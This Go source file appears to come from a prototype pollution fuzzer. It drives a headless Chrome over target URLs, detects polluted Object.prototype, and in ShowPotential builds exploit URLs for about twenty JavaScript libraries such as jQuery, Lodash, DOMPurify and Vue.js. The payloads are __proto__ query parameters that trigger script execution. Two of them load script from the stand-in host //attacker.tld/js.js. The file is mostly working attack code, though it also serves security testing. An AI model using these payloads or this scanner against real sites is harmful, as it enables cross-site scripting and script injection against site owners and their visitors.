package fuzzer

import (
	"context"
	"fmt"
	"net/url"
	"sync"

	"github.com/chromedp/chromedp"
	"github.com/bytes-Knight/ppfuzz/pkg/parser"
)

// New starts the fuzzing process.
func New(urls []string, browserCtx context.Context, opt *parser.Options) {
	var wg sync.WaitGroup
	semaphore := make(chan struct{}, opt.Concurrency)

	for _, u := range urls {
		wg.Add(1)
		semaphore <- struct{}{}
		go func(u string) {
			defer wg.Done()
			defer func() { <-semaphore }()

			var polluted bool
			err := chromedp.Run(browserCtx,
				chromedp.Navigate(u),
				chromedp.Evaluate(`(window.ppfuzz || Object.prototype.ppfuzz) == 'reserved'`, &polluted),
			)

			if err == nil && polluted {
				var gadgets []string
				// Re-run with the fingerprint script
				err = chromedp.Run(browserCtx,
					chromedp.Navigate(u),
					chromedp.Evaluate(FingerprintJS, &gadgets),
				)

				if err == nil {
					fmt.Printf("[VULNERABLE] %s\n", u)
					if len(gadgets) > 0 {
						fingerprint(u, gadgets)
					}
				}
			}
		}(u)
	}

	wg.Wait()
}

func fingerprint(targetURL string, gadgets []string) {
	for _, gadget := range gadgets {
		urls := ShowPotential(targetURL, gadget)
		for _, u := range urls {
			fmt.Printf("  [INFO] %s (%s)\n", u, gadget)
		}
	}
}

// ShowPotential generates a list of URLs with prototype pollution payloads for a given gadget.
func ShowPotential(targetURL, gadget string) []string {
	var urls []string
	u, err := url.Parse(targetURL)
	if err != nil {
		return urls
	}

	params := u.Query()

	switch gadget {
	case "Adobe Dynamic Tag Management":
		params.Add("__proto__[src]", "data:,alert(1)//")
		u.RawQuery = params.Encode()
		urls = append(urls, u.String())
	case "Akai Boomerang":
		params.Add("__proto__[BOOMR]", "1")
		params.Add("__proto__[url]", "//attacker.tld/js.js")
		u.RawQuery = params.Encode()
		urls = append(urls, u.String())
	case "Closure":
		params.Add("__proto__[CLOSURE_BASE_PATH]", "data:,alert(1)//")
		u.RawQuery = params.Encode()
		urls = append(urls, u.String())
	case "DOMPurify":
		params.Add("__proto__[ALLOWED_ATTR][0]", "onerror")
		params.Add("__proto__[ALLOWED_ATTR][1]", "src")
		u.RawQuery = params.Encode()
		urls = append(urls, u.String())
	case "Embedly":
		params.Add("__proto__[onload]", "alert(1)")
		u.RawQuery = params.Encode()
		urls = append(urls, u.String())
	case "jQuery":
		// First payload
		params1 := u.Query()
		params1.Add("__proto__[context]", "<img/src/onerror=alert(1)>")
		params1.Add("__proto__[jquery]", "x")
		u.RawQuery = params1.Encode()
		urls = append(urls, u.String())

		// Second payload, starting fresh from the original URL's query
		u, _ = url.Parse(targetURL)
		params2 := u.Query()
		params2.Add("__proto__[url][]", "data:,alert(1)//")
		params2.Add("__proto__[dataType]", "script")
		u.RawQuery = params2.Encode()
		urls = append(urls, u.String())
	case "js-xss":
		params.Add("__proto__[whiteList][img][0]", "onerror")
		params.Add("__proto__[whiteList][img][1]", "src")
		u.RawQuery = params.Encode()
		urls = append(urls, u.String())
	case "Knockout.js":
		params.Add("__proto__[4]", "a':1,[alert(1)]:1,'b")
		params.Add("__proto__[5]", ",")
		u.RawQuery = params.Encode()
		urls = append(urls, u.String())
	case "Lodash <= 4.17.15":
		params.Add("__proto__[sourceURL]", "alert(1)")
		u.RawQuery = params.Encode()
		urls = append(urls, u.String())
	case "Marionette.js / Backbone.js":
		params.Add("__proto__[tagName]", "img")
		params.Add("__proto__[src][]", "x:")
		params.Add("__proto__[onerror][]", "alert(1)")
		u.RawQuery = params.Encode()
		urls = append(urls, u.String())
	case "Google reCAPTCHA":
		params.Add("__proto__[srcdoc][]", "<script>alert(1)</script>")
		u.RawQuery = params.Encode()
		urls = append(urls, u.String())
	case "sanitize-html":
		// First payload
		params1 := u.Query()
		params1.Add("__proto__[*][]", "onload")
		u.RawQuery = params1.Encode()
		urls = append(urls, u.String())

		// Second payload, starting fresh from the original URL's query
		u, _ = url.Parse(targetURL)
		params2 := u.Query()
		params2.Add("__proto__[innerText]", "<script>alert(1)</script>")
		u.RawQuery = params2.Encode()
		urls = append(urls, u.String())
	case "Segment Analytics.js":
		params.Add("__proto__[script][0]", "1")
		params.Add("__proto__[script][1]", "<img/src/onerror=alert(1)>")
		params.Add("__proto__[script][2]", "1")
		u.RawQuery = params.Encode()
		urls = append(urls, u.String())
	case "Sprint.js":
		params.Add("__proto__[div][intro]", "<img src onerror=alert(1)>")
		u.RawQuery = params.Encode()
		urls = append(urls, u.String())
	case "Swiftype Site Search":
		params.Add("__proto__[xxx]", "alert(1)")
		u.RawQuery = params.Encode()
		urls = append(urls, u.String())
	case "Tealium Universal Tag":
		params.Add("__proto__[attrs][src]", "1")
		params.Add("__proto__[src]", "//attacker.tld/js.js")
		u.RawQuery = params.Encode()
		urls = append(urls, u.String())
	case "Twitter Universal Website Tag":
		params.Add("__proto__[attrs][src]", "1")
		params.Add("__proto__[hif][]", "javascript:alert(1)")
		u.RawQuery = params.Encode()
		urls = append(urls, u.String())
	case "Wistia Embedded Video":
		params.Add("__proto__[innerHTML]", "<img/src/onerror=alert(1)>")
		u.RawQuery = params.Encode()
		urls = append(urls, u.String())
	case "Zepto.js":
		params.Add("__proto__[onerror]", "alert(1)")
		u.RawQuery = params.Encode()
		urls = append(urls, u.String())
	case "Vue.js":
		// First payload
		params1 := u.Query()
		params1.Add("__proto__[v-if]", "_c.constructor('alert(1)')()")
		u.RawQuery = params1.Encode()
		urls = append(urls, u.String())

		// Second payload, starting fresh from the original URL's query
		u, _ = url.Parse(targetURL)
		params2 := u.Query()
		params2.Add("__proto__[attrs][0][name]", "src")
		params2.Add("__proto__[attrs][0][value]", "xxx")
		params2.Add("__proto__[xxx]", "data:,alert(1)//")
		params2.Add("__proto__[is]", "script")
		u.RawQuery = params2.Encode()
		urls = append(urls, u.String())
	}
	return urls
}
